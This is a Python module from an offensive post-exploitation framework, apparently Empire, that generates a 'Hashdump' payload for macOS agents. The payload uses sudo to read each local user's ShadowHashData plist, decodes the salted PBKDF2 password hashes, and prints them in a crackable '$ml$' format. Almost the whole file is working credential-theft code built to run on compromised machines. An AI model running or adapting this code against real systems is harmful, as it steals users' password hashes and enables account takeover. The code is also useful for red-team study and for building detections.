from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Hashdump',
            'Author': ['@harmj0y'],
            'Description': ("Extracts found user hashes out of /var/db/dslocal/nodes/Default/users/*.plist"),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : True,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                "http://apple.stackexchange.com/questions/186893/os-x-10-9-where-are-password-hashes-stored"
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = """
import os
import base64
def getUserHash(userName):
    from xml.etree import ElementTree
    try:
        raw = os.popen('sudo defaults read /var/db/dslocal/nodes/Default/users/%s.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - 2> /dev/null' %(userName)).read()
        if len(raw) > 100:
            root = ElementTree.fromstring(raw)
            children = root[0][1].getchildren()
            entropy64 = ''.join(children[1].text.split())
            iterations = children[3].text
            salt64 = ''.join(children[5].text.split())
            entropyRaw = base64.b64decode(entropy64)
            entropyHex = entropyRaw.encode("hex")
            saltRaw = base64.b64decode(salt64)
            saltHex = saltRaw.encode("hex")
            return (userName, "$ml$%s$%s$%s" %(iterations, saltHex, entropyHex))
    except Exception as e:
        print "getUserHash() exception: %s" %(e)
        pass
userNames = [ plist.split(".")[0] for plist in os.listdir('/var/db/dslocal/nodes/Default/users/') if not plist.startswith('_')]
userHashes = []
for userName in userNames:
    userHash = getUserHash(userName)
    if(userHash):
        userHashes.append(getUserHash(userName))
print userHashes
"""
        return script